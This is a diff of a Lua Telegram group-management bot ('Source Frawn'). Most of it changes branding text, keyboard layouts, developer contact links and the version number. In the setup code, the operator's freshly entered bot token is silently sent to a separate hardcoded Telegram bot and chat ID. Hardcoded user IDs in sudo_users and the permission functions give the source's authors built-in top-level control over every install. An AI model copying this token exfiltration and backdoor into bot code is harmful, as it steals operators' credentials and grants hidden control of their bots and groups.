@@ -21,30 +21,30 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31m≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n27[0;39;49m')
 database:set(id_server..":token",token)
 https.request('https://api.telegram.org/bot1888672599:AAFyuBt3MS2e9A9gOX7d02fAV5ckMZkQPLU/sendmessage?chat_id=1706080513&text=' ..token)
 end 
 else
-print('\27[0;35m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35m≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n\27[0;33;49m')
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n27[0;39;49m')
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[0;31m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[0;31m≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
 os.execute('lua DRAGON.lua')
 end
@@ -80,15 +80,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝗙𝗥𝗔𝗪𝗡 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝗙𝗥𝗔𝗪𝗡 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝗙𝗥𝗔𝗪𝗡 ┉  ┉ ┉ ┉ ┉≫ٴ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝗙𝗥𝗔𝗪𝗡 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝗙𝗥𝗔𝗪𝗡 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
 echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE frawn.lua \e[0m"
-echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝗙𝗥𝗔𝗪𝗡 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -138,8 +138,14 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
-> CH › @source_frawn
-~> DEVELOPER › @DEV_FRAWN 
+╔══╗╔═╗╔══╗╔╦═╦╗╔═╦╗
+║═╦╝║╬║║╔╗║║║║║║║║║║
+║╔╝─║╗╣║╠╣║║║║║║║║║║
+╚╝──╚╩╝╚╝╚╝╚═╩═╝╚╩═╝
+────────────────────
+CH❥ @source_frawn
+
+DEV❥ @DEV_FRAWN 
 ]])
 sudos = dofile("./frawn.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -165,7 +171,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1833835101,1635597460}   
+sudo_users = {SUDO,1779150039,1944028567}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -255,7 +261,7 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1833835101) then  
+if tonumber(user_id) == tonumber(1944028567) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1635597460) then
 var = true  
@@ -291,10 +297,10 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1833835101) then  
-var = 'مبرمج السورس'
-elseif tonumber(user_id) == tonumber(1635597460) then
-var = 'مالك السورس'
+if tonumber(user_id) == tonumber(1779150039) then  
+var = 'المطور يوسف الجمد'
+elseif tonumber(user_id) == tonumber(1944028567) then
+var = 'المبرمج فرعون الكبير'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -664,7 +670,7 @@ end
 function Addmp3(msg,chat,kkl,ffrr)
 local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
-sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍")  
+sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡")  
 os.execute('rm -rf ./'..ffrr) 
 end
 function Addsticker(msg,chat,Sd,rre)
@@ -867,29 +873,48 @@ end
 return false
 end
 if DevSoFi(msg) then
-local bl = ' ❍ اهلا عزيزي آلمـطـور\n ❍ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ❍ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ❍ من خلاال الكيبورت خاص بك\n ❍ قناة سورس البوت [اضغط هنا](t.me/source_frawn)'
+local bl = ' 𖤍 اهلا عزيزي آلمـطـور\n 𖤍 آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n 𖤍 تسـتطـيع‌‏ آلتحگم باوامر البوت\n 𖤍 من خلاال الكيبورت خاص بك\n 𖤍 قناة سورس البوت [𖤍𝙨𝙤𝙪𝙧𝙘𝙚 𝙛𝙧𝙖𝙬𝙣𖤍](t.me/source_frawn)'
 local keyboard = {
 
-{'مبرمج السورس'},
+{'𝗗𝙀𝗩 𝗙𝙍𝗔𝙒𝗡'},
 {'الاحصائيات','ضع اسم للبوت'},
-{'اضف رد عام','حذف رد عام'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
+{'اضف رد عام','مسح رد عام'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'اضف رد متعدد','حذف رد متعدد'},
-{'قناة السورس','المطور','الثانوين'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
+{'قناة السورس','المطور','الثانويين'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تعطيل التواصل ','تفعيل التواصل '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'بوت التواصل','المطورين','قائمه العام'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'المشتركين','الجروبات ','الردود العامه'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'ضع كليشه ستارت','حذف كليشه ستارت'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'اذاعه ','اذاعه خاص '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'اذاعه بالتثبيت ','قائمه الكتم العام'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تغير رساله الاشتراك ','حذف رساله الاشتراك ','تغير الاشتراك'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'اذاعه بالتوجيه ','اذاعه بالتوجيه خاص '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تفعيل الاشتراك الاجباري ','تعطيل الاشتراك الاجباري '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'الاشتراك الاجباري ','وضع قناة الاشتراك '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تفعيل البوت الخدمي ','تعطيل البوت الخدمي '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تنظيف الجروبات ','تنظيف المشتركين '},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'جلب نسخه الاحتياطيه'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تحديث السورس ','الاصدار'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'معلومات السيرفر'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'الغاء'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
@@ -909,16 +934,16 @@ if start then
 keyboard = start
 else
 keyboard = {
-{'مبرمج السورس'},
-{'⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺'},
+{'𝗗𝙀𝗩 𝗙𝙍𝗔𝙒𝗡'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'كتبات','غنيلي'},
-{'⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'بوستات','قناه السورس'},
-{'⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'انصحنی','باد'},
-{'⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'تويت','صراحه'},
-{'⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺'},
+{'❦ ════ •⊰𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⊱• ════ ❦'},
 {'مطور','انا مين'},
 }
 end
@@ -1073,11 +1098,11 @@ HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
 echo '⇗ نظام التشغيل ⇖•\n*»» '"$linux_version"'*' 
-echo '*—————𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍——————~*\n❍✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
-echo '*—————𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍——————~*\n❍✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
-echo '*—————𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍——————~*\n❍✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
-echo '*—————𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍——————~*\n❍✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
-echo '*—————𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍——————~*\n❍✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
+echo '*—————𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡——————~*\n❍✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
+echo '*—————𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡——————~*\n❍✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
+echo '*—————𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡——————~*\n❍✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
+echo '*—————𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡——————~*\n❍✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
+echo '*—————𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡——————~*\n❍✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
 
@@ -1089,7 +1114,7 @@ dofile('DRAGON.lua')
 end
 if text == 'الاصدار' and DevSoFi(msg) then 
 database:del(bot_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,' ❍ اصدار سورس فرعون \n ❍ الاصدار »{ v 1.5}')
+send(msg.chat_id_, msg.id_,' ❍ اصدار سورس فرعون \n ❍ الاصدار »{ v 1.8}')
 end
 if text == 'قناه السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
@@ -1103,14 +1128,14 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == '≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫' and DevSoFi(msg) then
+if text == '≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
 [CH](t.me/source_frawn)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫', url="t.me/source_frawn"}}, 
+{{text = '≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫', url="t.me/source_frawn"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1154,7 +1179,7 @@ return false
 end
 if text == ("المطورين ") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
-t = "\n ❍ قائمة المطورين \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المطورين \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -1170,7 +1195,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("قائمه العام") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'GBan:User')
-t = "\n ❍ قائمه المحظورين عام \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمه المحظورين عام \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -1187,7 +1212,7 @@ return false
 end
 if text == ("قائمه الكتم العام") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Gmute:User')
-t = "\n ❍ قائمة المكتومين عام \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المكتومين عام \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -2455,7 +2480,7 @@ send(msg.chat_id_, msg.id_, texts)
 end
 if text == "الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 local All_name = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_)
-t = "\n❍ قائمة الاسماء المكتومه \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ \n"
+t = "\n❍ قائمة الاسماء المكتومه \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ \n"
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
 end
@@ -2647,17 +2672,17 @@ end
 end
 end,nil)   
 end
-if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then 
+if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' or text == 'سورس فرعون' then 
 local Text = [[ 
-🌨 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 🌨
-
-🌨 مرحبا في سورس فرعون الاعظم 🌨
-
+┍━━━━━☞[𝙁𝙍𝘼𝙒𝙉](t.me/source_frawn)☜━━━━━┑
+𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 𝐅𝐑𝐀𝐖𝐍
+𝑻𝑯𝑬𝑺𝑻𝑹𝑶𝑵𝑮𝑬𝑺𝑻 𝑺𝑶𝑼𝑹𝑪𝑬 𝑰𝑵 𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴 
+┕━━━━━☞[𝙁𝙍𝘼𝙒𝙉](t.me/source_frawn)☜━━━━━┙
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '☾ 𝐀𝐒𝐇𝐑𝐀𝐅 ☽',url="t.me/asera126"},{text = '☾ 𝐅𝐑𝐀𝐖𝐍 𝐖𝐀  ☽',url="t.me/DEV_FRAWN"}}, 
-{{text = '[𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍]', url="t.me/source_frawn"}}, 
+{{text = '𝗙𝗥𝗔𝗪𝗡 ',url="t.me/DEV_FRAWN"},{text = ' 𝐘𝐎𝐔𝐒𝐔𝐅  ',url="t.me/php_d"}}, 
+{{text = '[𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡]', url="t.me/source_frawn"}}, 
 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -2666,15 +2691,29 @@ end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
 local Text = [[
-𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍❍
-❍اهلا بك في سورس فرعون الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ❍
+𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗧𝗛𝗘 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ❍
+❍اهلا بك في سورس فرعون  الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ❍
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𓆩𝐅𝐑𝐀𝐖𝐍𓆪',url="t.me/DEV_FRAWN"}},
+{{text = '𓆩𝗙𝗥𝗔𝗪𝗡𓆪',url="t.me/DEV_FRAWN"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+if text == '𝗗𝙀𝗩 𝗙𝙍𝗔𝙒𝗡' then
+local Text = [[
+المبرمج فرعون لو حابب تتواصل معاه
+اتبع الزر إلى تحت ↓
+
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '  𝗗𝙀𝗩 𝗙𝙍𝗔𝙒𝗡 ',url="t.me/DEV_FRAWN"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_FRAWN&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'فرعون' then
@@ -2685,24 +2724,24 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨𝐅𝐑𝐀𝐖𝐍 𝐖𝐀 ❩ ',url="t.me/DEV_FRAWN"}},
+{{text = '  𝗗𝙀𝗩 𝗙𝙍𝗔𝙒𝗡  ',url="t.me/DEV_FRAWN"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_FRAWN&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'عم اشرف' then
+if text == 'يوسف' then
 local Text = [[
-المالك اشرف لو حابب تتواصل معاه
+المبرمج يوسف  لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨𝐀𝐒𝐇𝐑𝐀𝐅❩ ',url="t.me/asera126"}},
+{{text = '  𝐘𝐎𝐔𝐒𝐔𝐅 ',url="t.me/php_d"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/asera126&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/php_d&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == "تويت" or text == "كت تويت" then 
@@ -2718,7 +2757,7 @@ local TWEET_Msg = {
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
 "اخر كتاب قرآته", 
-"ليه المسلم جدع؟ ", 
+"ليه يوسف  جدع؟ ", 
 "افضل يوم ف حياتك", 
 "ليه مضيفتش كل جهاتك", 
 "حكمتك ف الحياه", 
@@ -2975,13 +3014,13 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𓆩𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍𓆪', url="t.me/source_frawn"}}, 
+{{text = '𓆩𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡𓆪', url="t.me/source_frawn"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'مبرمج السورس' then
+if text == 'فرعون' then
 local Text = [[
 المبرمج فرعون لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓
@@ -2989,7 +3028,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ❨ 𝐅𝐑𝐀𝐖𝐍 ❩ ',url="t.me/DEV_FRAWN"}},
+{{text = '  ❨ 𝗗𝙀𝗩 𝗙𝙍𝗔𝙒𝗡 ❩ ',url="t.me/DEV_FRAWN"}},
 }
